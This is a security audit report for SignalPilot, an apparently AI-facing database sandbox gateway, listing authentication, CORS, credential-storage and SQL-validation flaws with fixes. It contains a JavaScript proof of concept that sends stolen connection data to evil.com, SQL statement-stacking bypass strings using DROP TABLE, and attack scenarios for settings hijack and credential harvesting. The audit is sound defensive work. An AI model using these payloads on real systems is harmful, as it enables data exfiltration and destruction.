# SignalPilot Security Audit Report

**Date:** 2026-03-31
**Scope:** MCP Server, Gateway API, Credential Management, Sandbox Manager, SQL Governance Engine, Web Frontend
**Severity Scale:** CRITICAL / HIGH / MEDIUM / LOW / INFO

---

## Executive Summary

SignalPilot is a governed sandbox for AI database access built on FastAPI (gateway), Firecracker microVMs (code execution), and an MCP server (Claude Code integration). The architecture makes sound security choices at the infrastructure level (Firecracker isolation, readonly transactions, AST-based SQL validation), but has significant gaps in application-layer security that would allow unauthorized access, credential theft, and governance bypass in any deployment beyond localhost.

**Critical findings: 3 | High: 7 | Medium: 8 | Low: 5 | Informational: 4**

---

## CRITICAL Findings

### CRIT-01: Zero Authentication on All Gateway Endpoints

**Location:** `gateway/main.py:95-107`
**CVSS:** 9.8 (Network/Low/None/Changed/High/High)

The FastAPI application has no authentication middleware. Every endpoint — including connection management, sandbox creation, code execution, settings modification, and audit log access — is publicly accessible to anyone who can reach port 3300.

```python
app = FastAPI(title="SignalPilot Gateway", ...)
app.add_middleware(CORSMiddleware, allow_origins=["*"], ...)  # wide open
# No auth middleware anywhere
```

**Impact:** Any network-adjacent attacker can:

- Create/delete database connections
- Execute arbitrary code in sandboxes
- Read all audit logs (including SQL queries with potentially sensitive data)
- Modify gateway settings (redirect sandbox manager URL)
- Exfiltrate credential metadata

**Recommendation:**

1. Add JWT or API key authentication middleware
2. Implement role-based access control (admin vs. read-only)
3. Restrict CORS origins to the frontend domain only
4. Add rate limiting per client

---

### CRIT-02: CORS Allow-All Permits Cross-Origin Credential Theft

**Location:** `gateway/main.py:102-107`

```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)
```

**Impact:** Any website can make cross-origin requests to the gateway. Combined with CRIT-01 (no auth), a malicious webpage opened in the same browser can:

- Enumerate and exfiltrate all database connections
- Execute SQL queries against connected databases
- Run arbitrary Python code in sandboxes
- Modify settings to redirect the sandbox manager to an attacker-controlled server

**PoC:** A user visiting `evil.com` while the gateway is running on `localhost:3300`:

```javascript
// evil.com can do this
fetch("http://localhost:3300/api/connections")
  .then((r) => r.json())
  .then((data) =>
    fetch("https://evil.com/exfil", {
      method: "POST",
      body: JSON.stringify(data),
    }),
  );
```

**Recommendation:** Set `allow_origins` to `["http://localhost:3200"]` at minimum. Add `allow_credentials=False`.

---

### CRIT-03: Sandbox Manager URL Redirection (Settings Tampering)

**Location:** `gateway/main.py:140-144`, `gateway/store.py:57-65`

The `PUT /api/settings` endpoint allows unauthenticated modification of `sandbox_manager_url`. An attacker can redirect all code execution to a malicious server that:

- Captures all code sent for execution (including any secrets in the code)
- Returns manipulated results
- Acts as a man-in-the-middle for all sandbox operations

```python
@app.put("/api/settings")
async def update_settings(settings: GatewaySettings):
    save_settings(settings)        # Writes attacker URL to disk
    _reset_sandbox_client()        # Reconnects to attacker server
    return settings
```

**Impact:** Complete takeover of the execution pipeline. All subsequent code executions go to the attacker.

**Recommendation:** Require authentication for settings changes. Validate sandbox_manager_url against an allowlist. Log settings changes to a tamper-evident audit trail.

---

## HIGH Findings

### HIGH-01: Credentials Stored in Plaintext at Rest (settings.json)

**Location:** `gateway/store.py:29,57-69`

`GatewaySettings` includes `sandbox_api_key` and `api_key` fields that are serialized directly to `~/.signalpilot/settings.json` as plaintext JSON.

```python
def save_settings(settings: GatewaySettings):
    _save_json(SETTINGS_FILE, settings.model_dump())  # includes api_key, sandbox_api_key
```

While database credentials are kept in-memory only (`_credential_vault`), the API keys for the sandbox manager and gateway are persisted in plaintext.

**Impact:** Any local file read vulnerability or backup exposure leaks API keys.

**Recommendation:** Encrypt sensitive fields using the `cryptography` library (already a dependency). Use OS keyring or environment variables for secrets.

---

### HIGH-02: In-Memory Credential Vault Has No Access Control

**Location:** `gateway/store.py:33,122-123`

```python
_credential_vault: dict[str, str] = {}

def get_connection_string(name: str) -> str | None:
    return _credential_vault.get(name)
```

The credential vault is a plain dict with no access control. Any code path in the gateway process can read any credential. Combined with CRIT-01 (no auth), the connection string (containing username:password) is used directly in query execution, meaning the full credential flows through multiple unauthenticated code paths.

**Impact:** Connection strings with passwords are accessible to any authenticated code path. If any endpoint leaks internal state (error messages, debug info), credentials could be exposed.

**Recommendation:** Wrap the vault in a class with access logging. Encrypt credentials in memory. Implement credential rotation support.

---

### HIGH-03: SQL Validation Bypass via sqlglot Fallback

**Location:** `gateway/engine/__init__.py:59-61, 110-113`

If `sqlglot` is not installed (import fails), ALL validation is silently skipped:

```python
try:
    import sqlglot
    HAS_SQLGLOT = True
except ImportError:
    HAS_SQLGLOT = False

def validate_sql(sql, ...):
    ...
    if not HAS_SQLGLOT:
        return ValidationResult(ok=True, tables=[], columns=[])  # PASSES EVERYTHING
```

Similarly for `inject_limit`:

```python
if not HAS_SQLGLOT:
    upper = sql.upper()
    if "LIMIT" not in upper:  # trivial bypass: SELECT * FROM users -- LIMIT
        return f"{sql} LIMIT {max_rows}"
```

**Impact:** If `sqlglot` is somehow unavailable (dependency confusion, corrupted install), all SQL governance is disabled. The LIMIT fallback can be bypassed with a SQL comment containing "LIMIT".

**Recommendation:** Make `sqlglot` a hard dependency — fail fast on import error. Remove the fallback code paths entirely.

---

### HIGH-04: Statement Stacking Detection Bypass

**Location:** `gateway/engine/__init__.py:33,53`

```python
_STACKING_PATTERN = re.compile(r";\s*\w", re.IGNORECASE)
```

This regex only catches semicolons followed by whitespace and a word character. Bypasses:

1. `SELECT 1; --\nDROP TABLE customers` — comment after semicolon, then newline
2. `SELECT 1;/**/DROP TABLE customers` — block comment instead of whitespace
3. `SELECT 1;\tDROP TABLE customers` — but `\s*` catches `\t`, so this works

Actually, bypass #1 works because `--` after `;` means `;\s*-` where `-` is not `\w`. The stacking pattern would NOT match `; -- \nDROP`, letting a stacked statement through.

However, the secondary defense (`len(statements) > 1` check via sqlglot parse at line 67) would catch most of these. The regex is belt-and-suspenders, but the gap should be documented.

**Additionally:** The stacking check uses `.rstrip(";")` which strips trailing semicolons. This means `SELECT 1;` passes, but `SELECT 1; ` (with trailing space) also passes as expected. However, `SELECT 1;\x00DROP TABLE x` (null byte injection) may not be caught by either the regex or sqlglot.

**Recommendation:** Use sqlglot's multi-statement detection as the primary defense. Add explicit null-byte stripping. Consider using `sqlparse` as a secondary parser.

---

### HIGH-05: No Rate Limiting on Code Execution

**Location:** `gateway/mcp_server.py:55-113`, `gateway/main.py:254-286`

There is no rate limiting on the `/execute` endpoint or `execute_code` MCP tool. An attacker can:

- Exhaust all VM slots (MAX_VMS=10) with long-running code
- Cause resource starvation (CPU, memory, disk I/O)
- Fill disk with overlays (`shutil.copy2` of rootfs for each execution)

The `budget_usd` field exists in `SandboxInfo` but is never checked or decremented.

```python
class SandboxInfo(BaseModel):
    budget_usd: float = 10.0
    budget_used: float = 0.0  # never incremented anywhere
```

**Recommendation:** Implement per-session rate limiting. Enforce budget tracking. Add disk space monitoring for overlays directory.

---

### HIGH-06: Error Messages Leak Internal Details

**Location:** `gateway/main.py:342-343`

```python
except Exception as e:
    await connector.close()
    raise HTTPException(status_code=500, detail=str(e))
```

Database errors (including connection strings in some drivers, table structures, version info) are returned directly to the client. PostgreSQL error messages can contain column names, query fragments, and internal details.

**Recommendation:** Log full errors server-side. Return generic error messages to clients. Never include `str(e)` from database exceptions in responses.

---

### HIGH-07: Sandbox Manager Has No Authentication

**Location:** `sp-firecracker-vm/sandbox_manager.py:480-563`

The sandbox manager's HTTP API (port 8080/8180) has zero authentication. Any host that can reach it can execute arbitrary Python code in Firecracker VMs.

```python
async def handle_execute(request):
    body = await request.json()
    code = body.get("code")  # no auth check
    ...
```

While the Docker compose file doesn't expose this externally by default, the port mapping `8180:8080` makes it accessible on the host. In cloud deployments, this could be exposed on the internal network.

**Recommendation:** Add Bearer token authentication (the `sandbox_api_key` exists in settings but is never validated on the sandbox manager side). Add network-level restrictions (bind to internal Docker network only).

---

## MEDIUM Findings

### MED-01: Path Traversal via Connection Name

**Location:** `gateway/main.py:163-167`

```python
@app.get("/api/connections/{name}")
async def get_connection_detail(name: str):
```

The `name` parameter is used directly as a dict key in JSON file lookups. While this doesn't cause filesystem path traversal (it's a dict lookup, not file access), specially crafted names like `../../etc/passwd` or names with null bytes could cause unexpected behavior in JSON serialization.

The `ConnectionCreate` model validates `min_length=1, max_length=64` but doesn't restrict character set.

**Recommendation:** Add a regex validator for connection names: `^[a-zA-Z0-9_-]+$`

---

### MED-02: No HTTPS/TLS Support

**Location:** `gateway/main.py`, `docker-compose.yml`

All communication (gateway, sandbox manager, frontend) uses plain HTTP. Database credentials sent via `POST /api/connections` travel in plaintext.

**Recommendation:** Add TLS termination (nginx reverse proxy or uvicorn with SSL certs). Enforce HTTPS in production.

---

### MED-03: Audit Log Tampering

**Location:** `gateway/store.py:164-199`

The audit log (`audit.jsonl`) is an append-only JSON lines file with no integrity protection. An attacker with file system access can:

- Delete entries to cover tracks
- Modify entries to frame others
- Corrupt the file to prevent audit review

The `read_audit` function silently swallows parse errors:

```python
except Exception:
    pass  # corrupted entries silently ignored
```

**Recommendation:** Add HMAC signatures per entry. Use a write-once storage backend. Alert on parse errors instead of silently ignoring them.

---

### MED-04: Denial of Service via Audit Log

**Location:** `gateway/store.py:171-199`

`read_audit` loads the ENTIRE audit file into memory, then sorts and slices:

```python
async with aiofiles.open(AUDIT_FILE) as f:
    async for line in f:
        entries.append(...)
entries.sort(key=lambda e: e.timestamp, reverse=True)
return entries[offset : offset + limit]
```

With millions of audit entries, this causes OOM. There's no maximum file size, no rotation, and no streaming.

**Recommendation:** Use a proper database for audit storage, or implement log rotation with indexed lookup.

---

### MED-05: Unsafe exec() in Sandbox Init (Limited by Isolation)

**Location:** `sp-firecracker-vm/rootfs/sandbox_init.py:64`

```python
exec(compile(code, "<sandbox>", "exec"), {"__builtins__": __builtins__})
```

Full `__builtins__` are available, including `open()`, `__import__()`, `eval()`, etc. While Firecracker provides strong isolation, within the VM the code has full privileges (runs as PID 1 / root equivalent).

This is somewhat mitigated by the ephemeral nature of the VMs, but code could:

- Attempt network connections (if any networking is configured)
- Read the base rootfs contents
- Attempt kernel exploits (though Firecracker's seccomp filters mitigate this)

**Recommendation:** Consider restricting `__builtins__` to a safe subset. Add seccomp profiles to the Firecracker VM config. Document the threat model.

---

### MED-06: Connection Pool Not Reused (Resource Leak)

**Location:** `gateway/mcp_server.py:166-169`

```python
await connector.connect(conn_str)    # creates pool (1-5 connections)
rows = await connector.execute(safe_sql)
await connector.close()              # destroys pool
```

Every query creates a new connection pool (1-5 TCP connections) and destroys it after. Under load:

- TCP port exhaustion (TIME_WAIT accumulation)
- Unnecessary SSL handshake overhead
- PostgreSQL backend process churn

**Recommendation:** Maintain a connection pool per database connection, reuse across queries.

---

### MED-07: No Input Length Limits on SQL or Code

**Location:** `gateway/mcp_server.py:55,117`

The `execute_code` and `query_database` MCP tools accept arbitrarily large inputs. A multi-megabyte SQL query or code string could:

- Cause memory exhaustion during sqlglot parsing
- Slow down regex stacking detection
- Fill the audit log with huge entries

**Recommendation:** Add maximum input length validation (e.g., 1MB for code, 100KB for SQL).

---

### MED-08: Concurrent File Access Without Locking

**Location:** `gateway/store.py:40-52`

```python
def _load_json(path, default):
    return json.loads(path.read_text())

def _save_json(path, data):
    path.write_text(json.dumps(data, indent=2))
```

Concurrent requests can cause read-write races on `connections.json` and `settings.json`. Two simultaneous `create_connection` calls could lose one connection's data.

**Recommendation:** Use file locking (`fcntl.flock` / `msvcrt.locking`) or switch to SQLite for metadata storage.

---

## LOW Findings

### LOW-01: Hardcoded Default Credentials in Docker Compose

**Location:** `signalpilot/docker/docker-compose.yml:52-53`

```yaml
POSTGRES_PASSWORD: testpass
POSTGRES_DB: testdb
```

Default credentials in the development compose file. If this file is used in any non-dev environment, the database is accessible with known credentials.

**Recommendation:** Use environment variable interpolation (`${POSTGRES_PASSWORD}`) with a `.env` file.

---

### LOW-02: Sensitive Data in MCP Tool Responses

**Location:** `gateway/mcp_server.py:86,179-188`

Sandbox URLs and internal configuration details are returned in tool responses that may be visible in Claude Code conversation history:

- Sandbox manager URLs
- Execution timing metadata
- Full SQL queries in audit entries

**Recommendation:** Minimize metadata in tool responses. Mark sensitive fields.

---

### LOW-03: No Connection String Sanitization

**Location:** `gateway/store.py:126-135`

```python
def _build_connection_string(conn):
    pw = f":{conn.password}" if conn.password else ""
    return f"postgresql://{conn.username}{pw}@{host}:{port}/{db}"
```

Special characters in username/password (e.g., `@`, `:`, `/`) are not URL-encoded, which could cause connection failures or injection into the connection string.

**Recommendation:** Use `urllib.parse.quote_plus()` for username and password components.

---

### LOW-04: UUID Truncation Reduces Collision Resistance

**Location:** `sp-firecracker-vm/sandbox_manager.py:251,382`

```python
vm_id = str(uuid.uuid4())[:8]
```

Truncating UUIDs to 8 characters (32 bits) significantly increases collision probability. At ~10 concurrent VMs it's negligible, but with high throughput it becomes a concern.

**Recommendation:** Use at least 12 characters for VM IDs.

---

### LOW-05: Missing Content Security Policy Headers

**Location:** `signalpilot/web/` (Next.js frontend)

The web frontend doesn't set CSP, X-Frame-Options, or other security headers. This allows:

- Clickjacking via iframe embedding
- XSS if any user input is reflected

**Recommendation:** Add security headers via Next.js middleware or `next.config.js`.

---

## INFORMATIONAL Findings

### INFO-01: Snowflake/MySQL/DuckDB Connectors Not Implemented

`DBType` enum defines `snowflake`, `mysql`, `duckdb` but only PostgreSQL has a connector. Attempting to use these types would cause a runtime error.

### INFO-02: `cryptography` Library Imported but Never Used

Listed as a dependency in `pyproject.toml` but no code uses it. This was likely intended for credential encryption (see comment "encrypt at rest later" in store.py).

### INFO-03: Budget Tracking Not Implemented

`SandboxInfo.budget_usd` and `budget_used` fields exist but are never checked or updated. The "governance" budget system is aspirational only.

### INFO-04: Gateway API Key Field Exists but Is Not Enforced

`GatewaySettings.api_key` is stored but never validated against incoming requests.

---

## Attack Scenarios

### Scenario 1: Network-Adjacent Data Exfiltration (CRIT-01 + CRIT-02)

1. Attacker hosts `evil.com` with JavaScript that calls `http://localhost:3300/api/connections`
2. User with running SignalPilot visits `evil.com`
3. CORS `*` allows the cross-origin request
4. Attacker enumerates all database connections
5. Attacker calls `POST /api/query` to exfiltrate data from connected databases
6. All queries pass through governance (SELECT-only, row limits), but sensitive data is still readable

### Scenario 2: Sandbox Manager Takeover (CRIT-03)

1. Attacker calls `PUT /api/settings` to set `sandbox_manager_url` to `https://evil.com:8080`
2. All subsequent `execute_code` calls send user code to attacker's server
3. Attacker captures proprietary code, data analysis scripts, credentials in code
4. Attacker returns manipulated results

### Scenario 3: SQL Governance Bypass (HIGH-03 + HIGH-04)

1. If sqlglot dependency is corrupted/missing, all validation is skipped
2. Attacker sends `DROP TABLE customers;` — it passes validation and executes
3. Even with sqlglot present, the readonly transaction (`readonly=True`) provides defense in depth
4. However, the `readonly=True` behavior depends on PostgreSQL configuration and may not prevent all side effects (e.g., function calls, temp tables)

### Scenario 4: Credential Harvesting via Internal Credentials Table

1. Attacker connects to the enterprise test database (CRIT-01 allows adding connections)
2. Queries `SELECT * FROM internal_credentials` — passes SQL governance (it's a SELECT)
3. Obtains AWS keys, Stripe keys, Slack tokens, etc.
4. SQL governance blocks DDL/DML but cannot distinguish sensitive tables from regular tables (no column-level or row-level policy)

---

## Recommendations Priority Matrix

| Priority | Finding                            | Effort  | Impact                       |
| -------- | ---------------------------------- | ------- | ---------------------------- |
| P0       | CRIT-01: Add authentication        | Medium  | Blocks all remote attacks    |
| P0       | CRIT-02: Restrict CORS             | Trivial | Blocks cross-origin attacks  |
| P0       | CRIT-03: Protect settings endpoint | Low     | Blocks sandbox redirect      |
| P1       | HIGH-07: Auth on sandbox manager   | Low     | Blocks direct code execution |
| P1       | HIGH-01: Encrypt settings secrets  | Low     | Protects API keys at rest    |
| P1       | HIGH-03: Remove sqlglot fallback   | Trivial | Eliminates validation bypass |
| P1       | HIGH-06: Sanitize error messages   | Low     | Prevents info disclosure     |
| P2       | HIGH-05: Add rate limiting         | Medium  | Prevents DoS                 |
| P2       | MED-06: Reuse connection pools     | Medium  | Prevents resource exhaustion |
| P2       | MED-07: Input length limits        | Low     | Prevents memory abuse        |
| P3       | MED-01-05: Various                 | Varies  | Defense in depth             |

---

## Test Database Setup

For pentest validation, see `testing/docker-compose.yml` which creates:

- **enterprise-pg** (port 5601): OLTP database with customers, orders, payments, employees (with PII like SSN hashes, bank accounts), and an `internal_credentials` table with fake API keys
- **warehouse-pg** (port 5602): Analytics warehouse with star-schema fact/dimension tables, raw event data, and ML model outputs

Run `python generate_data.py` to populate with ~5GB of realistic fake data using Faker.
